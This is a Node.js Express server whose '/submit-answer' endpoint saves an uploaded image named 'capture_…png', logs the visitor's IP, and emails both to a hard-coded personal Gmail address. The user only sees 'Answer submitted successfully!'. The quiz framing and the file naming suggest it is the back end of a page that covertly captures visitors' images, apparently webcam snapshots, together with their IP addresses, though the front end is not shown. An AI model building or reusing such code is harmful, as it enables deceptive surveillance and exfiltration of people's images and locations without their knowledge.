require('dotenv').config();
const express = require('express');
const fs = require('fs/promises'); // Using promises for non-blocking file saving
const path = require('path');
const { Resend } = require('resend');

const app = express();
const port = process.env.PORT || 3000;
const resend = new Resend(process.env.RESEND_API_KEY);

app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/submit-answer', async (req, res) => {
    try {
        const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const imageData = req.body.image;

        if (!imageData) {
            return res.status(400).json({ message: 'No image received.' });
        }

        // Safely extract base64 data regardless of the image format
        const base64Data = imageData.split(';base64,').pop();
        const fileName = `capture_${Date.now()}.png`;
        const filePath = path.join(__dirname, fileName);

        // Save image asynchronously so it doesn't freeze the server
        await fs.writeFile(filePath, base64Data, 'base64');
        console.log(`Saved ${fileName} from IP: ${userIP}`);

        // Send email via Resend
const { data, error } = await resend.emails.send({
    from: 'onboarding@resend.dev',
    to: 'mmssnouse4@gmail.com',
    subject: 'New Quiz Capture',
    text: `A new quiz capture was submitted.

User IP: ${userIP}`,

    attachments: [
        {
            filename: fileName,
            content: base64Data
        }
    ]
});

        if (error) {
            console.error('Email error:', error);
            return res.status(500).json({ message: 'Saved image, but email failed.' });
        }

        res.json({ message: 'Answer submitted successfully!' });

    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ message: 'An unexpected error occurred.' });
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
